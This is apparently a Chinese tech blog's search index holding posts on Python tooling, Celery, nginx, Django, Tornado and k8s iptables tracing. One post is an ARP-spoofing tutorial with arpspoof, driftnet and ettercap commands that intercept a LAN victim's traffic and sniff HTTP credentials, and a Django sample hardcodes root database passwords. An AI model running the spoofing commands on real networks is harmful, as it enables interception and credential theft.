<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mac 常用配置]]></title>
    <url>%2F2019%2F01%2F23%2Fmac-config%2F</url>
    <content type="text"><![CDATA[这里主要记录mac使用中的一些小问题。 oh-my-zsh 去掉history共享12# Add follow line in $ZSH/oh-my-zsh.shunsetopt share_history]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cloud-init]]></title>
    <url>%2F2019%2F01%2F23%2Fcloud-init%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[使用cProfile分析python性能]]></title>
    <url>%2F2019%2F01%2F10%2Fcprofile%2F</url>
    <content type="text"><![CDATA[当我们的确是有需要开始真正优化我们的Python程序的时候，我们要做的第一步并不是盲目的去做优化，而是对我们现有的程序进行分析，发现程序的性能瓶颈进而进行针对性的优化。这样才会使我们花时间和精力去做的优化获得最大的效果。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[celery任务超时控制]]></title>
    <url>%2F2019%2F01%2F10%2Fcelery-time-limit%2F</url>
    <content type="text"><![CDATA[有时候celery任务的执行时间过长，如果没有有效控制可能导致mq消息大量堆积。celery 3.1以后的版本提供了超时机制。 超时设置celery 提供了两个参数来控制task超时时间： task_time_limit: 在指定时间内没有完成，task会被kill，然后开始下一个task。 task_soft_time_limit: 在celery配置文件中使用12time_limit = 30soft_time_limit = 10 在装饰器中使用123@app.taskdef mytask(time_limit=30, soft_time_limit=10): do_your_job() 捕获异常12345678from celery.exceptions import SoftTimeLimitExceeded@app.taskdef mytask(soft_time_limit=10): try: return do_work() except SoftTimeLimitExceeded: cleanup_in_a_hurry() 这里实际测试有些情况下仍然捕获不到异常，会直接抛出，出现类似打印： 123456789101112131415161718192021[2019-01-10 15:42:13,716: ERROR/ForkPoolWorker-11] Pool process &lt;celery.concurrency.asynpool.Worker object at 0x107fddb90&gt; error: SoftTimeLimitExceeded()Traceback (most recent call last): File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 289, in __call__ sys.exit(self.workloop(pid=pid)) File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 347, in workloop req = wait_for_job() File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 447, in receive ready, req = _receive(1.0) File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 419, in _recv return True, loads(get_payload()) File &quot;/Library/Python/2.7/site-packages/billiard/queues.py&quot;, line 355, in get_payload return self._reader.recv_bytes() File &quot;/Library/Python/2.7/site-packages/billiard/connection.py&quot;, line 245, in recv_bytes buf = self._recv_bytes(maxlength) File &quot;/Library/Python/2.7/site-packages/billiard/connection.py&quot;, line 458, in _recv_bytes buf = self._recv(4) File &quot;/Library/Python/2.7/site-packages/billiard/connection.py&quot;, line 424, in _recv chunk = read(handle, remaining) File &quot;/Library/Python/2.7/site-packages/billiard/pool.py&quot;, line 227, in soft_timeout_sighandler raise SoftTimeLimitExceeded()SoftTimeLimitExceeded: SoftTimeLimitExceeded() 参考文献[1] http://docs.celeryproject.org/en/latest/userguide/configuration.html#std:setting-task_time_limit]]></content>
      <categories>
        <category>mq</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyenv使用]]></title>
    <url>%2F2019%2F01%2F10%2Fpyenv%2F</url>
    <content type="text"><![CDATA[pyenv可以帮助你在一台开发机上建立多个版本的python环境， 并提供方便的切换方法。virtualenv可以搭建虚拟且独立的python环境，可以使每个项目环境与其他项目独立开来，保持环境的干净，解决包冲突问题。 安装1234567git clone https://github.com/pyenv/pyenv.git ~/.pyenvecho 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.bash_profileecho 'export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.bash_profileecho -e 'if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then\n eval "$(pyenv init -)"\nfi' &gt;&gt; ~/.bash_profile# restart shellexec "$SHELL" 安装python 版本1pyenv install 2.7.8 如果系统没有安装patch命令，在安装python的时候会报如下错误： 1/root/.pyenv/plugins/python-build/bin/python-build: line 1326: patch: command not found 解决办法： 1yum install patch -y pyenv-virtualenv光有pyenv还不够，我们需要结合virtualenv来使用, pyenv-virtualenv就是干这个活的。 安装12345git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenvecho 'eval "$(pyenv virtualenv-init -)"' &gt;&gt; ~/.bash_profile# restart shellexec "$SHELL" 使用1234567891011# 创建项目pyenv virtualenv 2.7.10 project# Activate virtualenvpyenv activate project# Deactive virtualenvpyenv deactivate# Delete existing virtualenvpyenv uninstall project 参考文献[1] https://github.com/pyenv/pyenv#installation[2] https://github.com/pyenv/pyenv-virtualenv]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx_log]]></title>
    <url>%2F2019%2F01%2F08%2Fnginx-log%2F</url>
    <content type="text"><![CDATA[nginx 日志需要自己进程转储。 crontab 方式1234mv access.log access.log.0kill -USR1 `cat master.nginx.pid`sleep 1gzip access.log.0 # do something with access.log.0 Log Rotation logrotate在 /etc/logrotate.d/nginx 文件中添加： 123456789101112/var/log/nginx/access/access.log &#123; rotate 3size=50Gmissingoknotifemptycompressdelaycompresssharedscripts postrotate /usr/sbin/nginx -s reload &gt; /dev/null 2&gt;&amp;1endscript&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[testtools]]></title>
    <url>%2F2018%2F12%2F21%2Ftesttools%2F</url>
    <content type="text"><![CDATA[testools是属于python中诸多自动化框架中的一个, 是python标准库中unittest的扩展。 优点 更好的assertion method 更多的调试信息 扩展自unittest，但是兼容unittest 支持不同python版本 assertion assertRaises 123456def test_square_bad_input(self): # 'square' raises a TypeError if it's given bad input, say a # string. e = self.assertRaises(TypeError, silly.square, "orange") self.assertEqual("orange", e.bad_value) self.assertEqual("Cannot square 'orange', not a number.", str(e)) ExpectedException 1234def test_square_root_bad_input_2(self): # 'square' raises a TypeError if it's given bad input. with ExpectedException(TypeError, "Cannot square.*"): silly.square('orange')]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python mock使用]]></title>
    <url>%2F2018%2F12%2F20%2Fmock%2F</url>
    <content type="text"><![CDATA[在测试中可以使用mock来模拟很多场景，而不需要去真正的执行代码。例如数据库查询，网络请求等。 使用场景 patching 方法 记录方法调用情况 查看方法是否通过正确的参数调用 1234567891011class ProductionClass: def method(self): self.something(1, 2, 3) def something(self, a, b, c): passreal = ProductionClass()real.something = MagicMock()real.method()real.something.assert_called_once_with(1, 2, 3) Mock类型Mock用来创建一个要模拟的对象。 12mock.Mock(spec=None, side_effect=None, return_value=DEFAULT, wraps=None, name=None, spec_set=None, unsafe=False, **kwargs) spec: 该参数代表要mock的对象，可以是list, strings, 类或者对象。如果传的是一个对象，会调用dir(),访问dir结果之外的属性都会报AttributeError.如果传的是对象，__class__会返回原来的类型。 return_value: mock对象调用的返回值,默认是Mock对象。 side_effect: 会覆盖return_value的返回值，一般用在抛异常或者动态改变返回值。 举例说明 return_value 12345678910111213import mockclass Production(ojbect): def print_hello(self): print 'hello world' m1 = mock.Mock(spec=Production)m2 = mock.Mock(spec=Production, return_value=1)print m1() # &lt;Mock name='mock()' id='4443060048'&gt;print m2() # 1print type(m1()) # &lt;class 'mock.mock.Mock'&gt;print type(m2()) # &lt;type 'int'&gt; side_effect的值可以是函数，可迭代对象或者是异常。 如果传参是函数，则会和mock使用相同的参数并调用。如果函数的返回值是DEFAULT怎使用正常的返回值（return_value指定的），否则返回函数的返回值。 如果传参是可迭代对象，则每次调用使用迭代器的返回值。 如果传参是异常，则调用会抛指定异常。 设置异常: 123456&gt;&gt;&gt; mock = Mock()&gt;&gt;&gt; mock.side_effect = Exception('Boom!')&gt;&gt;&gt; mock()Traceback (most recent call last): ...Exception: Boom! 设置可迭代对象: 1234&gt;&gt;&gt; mock = Mock()&gt;&gt;&gt; mock.side_effect = [3, 2, 1]&gt;&gt;&gt; mock(), mock(), mock()(3, 2, 1) 设置函数，这里返回DEFAULT: 1234567&gt;&gt;&gt; mock = Mock(return_value=3)&gt;&gt;&gt; def side_effect(*args, **kwargs):... return DEFAULT...&gt;&gt;&gt; mock.side_effect = side_effect&gt;&gt;&gt; mock()3 通过参数指定： 123456&gt;&gt;&gt; side_effect = lambda value: value + 1&gt;&gt;&gt; mock = Mock(side_effect=side_effect)&gt;&gt;&gt; mock(3)4&gt;&gt;&gt; mock(-8)-7 设置为None： 12345678&gt;&gt;&gt; m = Mock(side_effect=KeyError, return_value=3)&gt;&gt;&gt; m()Traceback (most recent call last): ...KeyError&gt;&gt;&gt; m.side_effect = None&gt;&gt;&gt; m()3 MagicMock是Mock的子类，它实现了大部分的magic method，而不需要你自己去配置。 patch 装饰器mock.patch12mock.patch(target, new=DEFAULT, spec=None, create=False, spec_set=None, autospec=None, new_callable=None, **kwargs) patch() 可以作为函数装饰器，类装饰器或上下文管理器。 如果没有指定new参数，patch对象会使用MagiMock替换。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次elasticsearch 索引迁移]]></title>
    <url>%2F2018%2F12%2F20%2Fes-migration%2F</url>
    <content type="text"><![CDATA[由于公司机房调整，需要将ES数据从一个集群迁移到另一集群。两个集群ES都是5.x版本，小版本存在差异，目标集群版本更低。数据由多个索引构成，每个索引大概1TB左右。 迁移方式查阅官方资料，提供了三种ES数据迁移方式：Migrating Your Elasticsearch Data 从资料看，Restore From a Snapshot 方式最快，适合备份大量数据，但是这种方式必须要求是相同版本或者是从低版本到高版本迁移，不适用目前场景，所以先排除。再看Reindex from a remote cluster, 这种方式也比较灵活，但在使用时需要在目标集群配置 reindex.remote.whitelist,由于集群已经上线，且是公用的，所有不能修改配置，排除这种方式。最后只有Index From the Source方式可以选择。 这种方式说白了就是通过http请求来完成的，一种方式是把原始索引保存到文件，然后再目标ES集群通过文件恢复。另一种方式是直接从原始ES集群读取请求，然后POST到目标集群。由于这里数据量比较大，保存文件的方式不太现实，只能通过网络发送。 问题如果采用from + size方式会有深度分页问题，这里采用scroll + bulk方式。 这里可以自己写脚本完成，可以通过 esm工具完成。需要注意的是自己写脚本需要有重试机制，否则每次失败都得重来。esm工具不支持后台运行，通过nohup和&amp;操作并没有效果，如需后台运行，配合screen工具使用。 还有一点需要注意的是，如果是跨机房拷贝，工具最好在同一个机房运行，否则会有很大的延时。通过测试esm工具拷贝500GB的索引,配置5个进程大概在2h左右。这里建议不要同时拷贝太多的索引，以免集群扛不住挂掉。 如果失败了，只能重新开始，因为scroll每次的结果并不是一样的，没法从断电继续运行。]]></content>
      <tags>
        <tag>elasticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[django 数据库读写分离]]></title>
    <url>%2F2018%2F12%2F14%2Fdjango-db-separation%2F</url>
    <content type="text"><![CDATA[使用数据库读写分离可以提高网站的性能，吞吐率。 配置数据库123456789101112131415161718192021222324DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'user', 'HOST': '192.168.2.100', 'PORT': 3306, 'USER': 'root', 'PASSWORD': '123456', 'OPTIONS': &#123; 'init_command': "SET sql_mode='STRICT_TRANS_TABLES'" &#125; &#125;, 'slave': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'user', 'HOST': '192.168.2.101', 'PORT': 3306, 'USER': 'root', 'PASSWORD': '123456', 'OPTIONS': &#123; 'init_command': "SET sql_mode='STRICT_TRANS_TABLES'" &#125; &#125;&#125; 设置读写分离手动设置在使用数据库时，通过.using(db_name)来手动指定要使用的数据库. 12345678910from django.shortcuts import HttpResponsefrom . import modelsdef write(request): models.User.objects.using('default').create(username='lina', password='123') return HttpResponse('写入成功')def read(request): obj = models.User.objects.filter(id=1).using('slave').first() return HttpResponse(obj.username) 自动设置 定义router 12345678910111213141516# 一主一从class Router(object): def db_for_read(self, model, **hint): return 'slave' def db_for_wirte(self, model, **hints): return 'default'# 一主多从class Router(object): def db_for_read(self, model, **hint): import random return random.choice(['slave1', 'slave2', 'slave3']) def db_for_wirte(self, model, **hints): return 'default' settings.py 加入DATABASE_ROUTERS设置 1DATABASE_ROUTERS = ['myrouter.Router',]]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>django</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arp 欺骗]]></title>
    <url>%2F2018%2F12%2F11%2Farp-spoofing%2F</url>
    <content type="text"><![CDATA[ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网上上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网上上特定计算机或所有计算机无法正常连线。 扫描局域网内活跃主机12345# 安装 fpingapt install fping -y # 扫描活跃主机fping -g -r 0 -s 192.168.1.0/24 | grep alive 识别主机12# -O 后面是需要扫描的主机列表nmap -T4 -O 192.168.1.100 192.168.1.101 arp 欺骗双向欺骗，这里 192.168.1.100 是第一步中扫描的目标主机，192.168.1.1 是网关地址。 123456# 安装 arpspoof 工具apt install dsniff -y# 开始 arp 欺骗arpspoof -i eth0 -t 192.168.1.100 192.168.1.1arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 这个时候目标已经不能上网了，我们开启主机的ip转发。 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 图片探嗅1driftnet -i eth0 效果不是很理想，广告比较多。 HTTP 账号探嗅12345# 安装 ettercap 工具apt install ettercap-text-only -y# 探嗅ettercap -Tq -i eth0 说明 本教程仅用于教学，切勿违法。]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>arp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tornado 获取提交数据]]></title>
    <url>%2F2018%2F12%2F08%2Ftornado-post%2F</url>
    <content type="text"><![CDATA[在进行前后台开发时，我们往往需要关注发送/接收数据的类型，不同类型的数据有不同的处理方式。 GET 数据获取获取查询参数1234# url: http://localhost/user?username=linaclass ProfileHandler(RequestHandler): def get(self): username = self.request.query_arguments.get('username', 'default') POST 数据获取POST 提交数据有四种方式，分别是 json, 这里我们使用 postman + tcpdump 分别来发送和抓取http报文。看看不同提交方式，在http里显示是什么样的。 tcpdump 抓包命令： 12# 这里抓取eth0网口，10000 端口,的报文sudo tcpdump -i eth0 port 10000 -w data.pcap 分别用 postman 发送不同格式的POST请求，然后抓取报文后使用wireshark分析，具体如下： json类型123456789101112131415POST /api/project/add HTTP/1.1Content-Type: application/jsoncache-control: no-cachePostman-Token: 833e2732-a7fe-41f2-927a-878462258069User-Agent: PostmanRuntime/7.4.0Accept: */*Host: 127.0.0.1:10000accept-encoding: gzip, deflatecontent-length: 45Connection: keep-alive&#123; &quot;username&quot;: &quot;lina&quot;, &quot;password&quot;: &quot;hello&quot;&#125; 可以看到json的格式比较简单，直接以字典的方式存放在body当中，tornado获取方式如下： 123class ProfileHandler(RequestHandler): def post(self): data = json.loads(self.request.body) x-www-form-urlencoded类型x-www-form-urlencoded 是默认的form提交方式，数据存放方式和QueryString的方式类似，具体如下： 123456789101112POST /api/project/add HTTP/1.1Content-Type: application/x-www-form-urlencodedcache-control: no-cachePostman-Token: ca8fe418-ca93-48ab-8eed-4545e57ee690User-Agent: PostmanRuntime/7.4.0Accept: */*Host: 127.0.0.1:10000accept-encoding: gzip, deflatecontent-length: 28Connection: keep-aliveusername=lina&amp;password=hello tornado 获取参数方式如下： 12345678class ProfileHandler(RequestHandler): def post(self): username = self.request.body_arguments.get('username', 'default')# 或者class ProfileHandler(RequestHandler): def post(self): username = self.get_arguement('username', 'default') form-data类型1234567891011121314151617181920POST /api/project/add HTTP/1.1Content-Type: multipart/form-data; boundary=--------------------------296134443182327800498848cache-control: no-cachePostman-Token: e013cd04-567a-42a2-b72a-10b70f5d7d4fUser-Agent: PostmanRuntime/7.4.0Accept: */*Host: 127.0.0.1:10000accept-encoding: gzip, deflatecontent-length: 279Connection: keep-alive----------------------------296134443182327800498848Content-Disposition: form-data; name=&quot;username&quot;lina----------------------------296134443182327800498848Content-Disposition: form-data; name=&quot;password&quot;hello----------------------------296134443182327800498848-- multipart/form-data类型的数据会生成boundary,用于分割不同字段，以避免正文内容重复。 使用 python 发送multipart/form-data数据比较麻烦，可以使用requests-toolbelt库。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103from requests_toolbelt import MultipartEncoderfrom webob import Requestimport io# Create a buffer object that can be read by the MultipartEncoder class# This works just like an open file objectfile = io.BytesIO()# The file content will be simple for my test.# But you could just as easily have a multi-megabyte mpg file# Write the contents to the filefile.write(b'test mpg content')# Then seek to the beginning of the file so that the# MultipartEncoder can read it from the beginningfile.seek(0)# Create the payloadpayload = MultipartEncoder( &#123; # The name of the file upload field... Not the file name 'uploadedFile': ( # This would be the name of the file 'This is my file.mpg', # The file handle that is ready to be read from file, # The content type of the file 'application/octet-stream' ) &#125;# To send the file, you would use the requests.post method# But the content type is not application-octet-stream# The content type is multipart/form-data; with a boundary string# Without the proper header type, your server would not be able to# figure out where the file begins and ends and would think the# entire post content is the file, which it is not. The post content# might even contain multiple files# So, to send your file, you would use:## response = requests.post(url, data=payload, headers=&#123;'Content-Type': payload.content_type&#125;)# Instead of sending the payload to the server,# I am just going to grab the output as it would be sent# This is because I don't have a server, but I can easily# re-create the object using this outputpostData = payload.to_string()# Create an input buffer object# This will be read by our server (our webob.Request object)inputBuffer = io.BytesIO()# Write the post data to the input buffer so that the webob.Request object can read itinputBuffer.write(postData)# And, once again, seek to 0inputBuffer.seek(0)# Create an error buffer so that errors can be written to it if there are anyerrorBuffer = io.BytesIO()# Setup our wsgi environment just like the server would give usenvironment = &#123; 'HTTP_HOST': 'localhost:80', 'PATH_INFO': '/index.py', 'QUERY_STRING': '', 'REQUEST_METHOD': 'POST', 'SCRIPT_NAME': '', 'SERVER_NAME': 'localhost', 'SERVER_PORT': '80', 'SERVER_PROTOCOL': 'HTTP/1.0', 'CONTENT_TYPE': payload.content_type, 'wsgi.errors': errorBuffer, 'wsgi.input': inputBuffer, 'wsgi.multiprocess': False, 'wsgi.multithread': False, 'wsgi.run_once': False, 'wsgi.url_scheme': 'http', 'wsgi.version': (1, 0)&#125;# Create our request object# This is the same as your request object and should have all our info for reading# the file content as well as the file namerequest = Request(environment)# At this point, the request object is the same as what you get on your server# So, from this point on, you can use the following code to get# your actual file content as well as your file name from the object# Our uploaded file is in the POST. And the POST field name is 'uploadedFile'# Grab our file so that it can be readuploadedFile = request.POST['uploadedFile']# To read our content, you can use uploadedFile.file.read()print(uploadedFile.file.read())# And to get the file name, you can use uploadedFile.filenameprint(uploadedFile.filename) text/xml]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>tornado</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tornado学习之requesthandler]]></title>
    <url>%2F2018%2F12%2F07%2Ftornado-requesthandler%2F</url>
    <content type="text"><![CDATA[RequestHandler write_error]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s iptables 规则查看]]></title>
    <url>%2F2018%2F11%2F29%2Fk8s-iptables%2F</url>
    <content type="text"><![CDATA[在访问 k8s 服务时，有时会出现一直连不上的问题，我们可以通过分析 iptables 和抓包的方式观察报文是否正确到达。关于 iptable 的介绍可以参考：iptables Iptables 跟踪设置如下，具体参考[1]: 12345678# Load the (IPv4) netfilter log kernel modulemodprobe nf_log_ipv4# Enable logging for the IPv4 (AF Family 2)sysctl net.netfilter.nf_log.2=nf_log_ipv4# restart rsyslogdsystemctl restart rsyslog 这里我们以 k8s NodePort 类型的 service 为例，假如我们希望追踪 23741 端口的规则，设置如下： 12iptables -t raw -j TRACE -p tcp --dport 32741 -I PREROUTING 1iptables -t raw -j TRACE -p tcp --dport 32741 -I OUTPUT 1 查看 /var/log/messages 中的追踪记录为了查看规则，现在某个机器上 curl 一下主机的 32741 端口。 1234567891011121314raw:PREROUTING:policy:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)nat:PREROUTING:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)nat:KUBE-SERVICES:rule:9 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)nat:KUBE-NODEPORTS:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)nat:KUBE-MARK-MASQ:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)nat:KUBE-MARK-MASQ:return:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000nat:KUBE-NODEPORTS:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000nat:KUBE-SVC-4N57TFCL4MD7ZTDA:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000nat:KUBE-SEP-PJQYOXMI5CEBVECW:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000filter:FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000filter:KUBE-FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000nat:POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000nat:KUBE-POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000raw:PREROUTING:policy:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343890 ACK=3563071810 WINDOW=4106 RES=0x00 ACK URGP=0 OPT (0101080A08CB9A71008611F0) 根据上面的图我们知道报文是按照 nat:PREROUTING -&gt; filter:FORWARD -&gt; nat:POSTROUTING 传输的。 按规则分析，先看第一条： 1nat:PREROUTING:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) iptables 的 PREROUTING 如下： 1234Chain PREROUTING (policy ACCEPT)target prot opt source destinationKUBE-SERVICES all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes service portals */DOCKER all -- 0.0.0.0/0 0.0.0.0/0 ADDRTYPE match dst-type LOCAL 可以看出所有报文都会匹配第一条规则，也就是 KUBE-SERVICES, 也就是 trace 里的： 1nat:KUBE-SERVICES:rule:9 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) 再看 iptables 的 KUBE-SERVICES 1234567891011Chain KUBE-SERVICES (2 references)target prot opt source destinationKUBE-MARK-MASQ udp -- !192.168.3.0/24 192.168.2.10 /* kube-system/kube-dns:dns cluster IP */ udp dpt:53KUBE-SVC-TCOU7JCQXEZGVUNU udp -- 0.0.0.0/0 192.168.2.10 /* kube-system/kube-dns:dns cluster IP */ udp dpt:53KUBE-MARK-MASQ tcp -- !192.168.3.0/24 192.168.2.10 /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53KUBE-SVC-ERIFXISQEP7F7OF4 tcp -- 0.0.0.0/0 192.168.2.10 /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53KUBE-MARK-MASQ tcp -- !192.168.3.0/24 192.168.2.1 /* default/kubernetes:https cluster IP */ tcp dpt:443KUBE-SVC-NPX46M4PTMTKRN6Y tcp -- 0.0.0.0/0 192.168.2.1 /* default/kubernetes:https cluster IP */ tcp dpt:443KUBE-MARK-MASQ tcp -- !192.168.3.0/24 192.168.2.125 /* default/nginx: cluster IP */ tcp dpt:80KUBE-SVC-4N57TFCL4MD7ZTDA tcp -- 0.0.0.0/0 192.168.2.125 /* default/nginx: cluster IP */ tcp dpt:80KUBE-NODEPORTS all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes service nodeports; NOTE: this must be the last rule in this chain */ ADDRTYPE match dst-type LOCAL 很明显匹配的是 KUBE-NODEPORTS, 也就是： 1TRACE: nat:KUBE-NODEPORTS:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 